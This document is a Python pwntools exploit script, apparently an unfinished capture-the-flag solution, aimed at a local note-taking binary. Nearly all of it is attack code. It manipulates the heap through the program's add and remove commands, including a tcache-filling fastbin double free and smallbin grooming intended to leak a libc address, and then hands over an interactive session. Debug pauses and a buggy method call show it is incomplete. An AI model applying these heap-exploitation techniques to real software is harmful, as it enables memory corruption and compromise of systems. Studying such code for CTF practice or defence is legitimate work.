import pwn

limit=0x2cbfff+1
p = pwn.process(['prlimit',f'--rss={limit}',f'--as={limit}','/vuln'])

#p = pwn.process('vuln')
sizes = []
read_idx = None

n = 0
def getidx():
    i = 0
    while True:
        if i in sizes:
            i += 1
            continue
        sizes.append(i)
        return i

def add(note, n_loc= None):
    global n
    if n_loc is None:
        n_loc = n-2
    if n_loc <= 0:
        n_loc =1
    n = n_loc +1
    p.sendlineafter(b'>',n_loc * b'a')
    p.sendlineafter(b'Note: ',note)
    return getidx()

def quit():
    p.sendlineafter(b'>',b'q')

def edit(idx,note):
    p.sendlineafter(b'>',b'e')
    p.sendlineafter(b'Index: ',f'{idx}'.encode())
    p.sendlineafter(b'Note: ',note)

def remove(idx):
    global n
    n -= 2
    if n <= 1:
        n =1

    p.sendlineafter(b'>',n * b'r')
    idx_str = f'{idx}'.encode()
    #idx_str = (n -1 - len(idx_str)) * b'0' + idx_str 
    p.sendlineafter(b'Index: ',idx_str)
    n = n + 1
    if not idx in sizes:
        print("double free")
        return
    sizes.remove(idx)


def dub_fast(a,b):
    if len(a) > 0x70 or b is not None and len(b) > 0x70:
        print("wrong size")
        exit()

    a1 = add(b'a')
    b1 = add(b'b')
    c1 = add(b'c')
    
    # fill tcache
    dummies = []
    for i in range(7):
        dummies.append(add(b''))

    for i in range(7):
        remove(dummies[i])

    dummies = []
    remove(a1)
    remove(b1)
    remove(a1)


    for i in range(7):
        dummies.append(add(b''))

    if b is not None:
        b = add(b)
    else: # dub malloced chunk into line_buf
        add(b'b1',0x70) # trigger realloc to get chunk of 0x80

    #dummies.append(add(b'b1')) # 0x60, to impede realloc again
    a = add(a)
    for d in dummies:
        remove(d)
    return (a,b)

def smallbin():
    add(b'',0x80)

    dummies = []
    for i in range(9):
        dummies.append(add(0x78 * f'{i}'.encode(),0x70))
    for i in range(8):
        remove(dummies[i])
    input()
    
    tar = add(b't1')
    
    dummies = []
    for i in range(7):
        dummies.append(add(0x70 * f'{i}'.encode(),0x70))
    for i in range(7):
        remove(dummies[i])

    remove(tar)
    input()
    for i in range(7):
        dummies.append(add(b''))
    add(b'ha',0x70)

def prepare_read():
    global read_idx
    #read_idx, _ = dub_fast(b'',None)

    limit = 0x20cf0
    limit = 0x1e010 - 0x10 # fills the chunk to its maximum size
    limit -= 0x100
    add(limit * b'a')

    limit = 0x1e10 - 0x15
    add(limit * b'b')

    limit = 0x790 - 0x15
    add(limit * b'c')
    limit = 0x3d0 - 0x15
    limit = 0x1c0
    add(limit * b'd')
    return
    input("here")
    limit = 0x1f0 - 0x15
    add(limit * b'e')
    input("here")
    
    limit = 0x100 - 0x15
    add(limit * b'f')
    input("here")

def read_add():
    if read_idx == None:
        print("prepare read first")
        exit()
    if not sizes.contains(read_idx):
        print("something went wrong")
        exit()
    
def trigger_read():
    limit = 0x80 - 0x15
    p.sendlineafter(b'>',limit * b'g')

def leak_libc():
    #prepare_read()
    smallbin()
    input()
    read_idx, _ = dub_fast(b'a1',None)
    input()
    remove(read_idx)
    trigger_read()

def main():
    try:
        input()
        leak_libc()
        
        p.interactive()
    except EOFError:
        print(p.recvall())

if __name__ == "__main__":
    main()
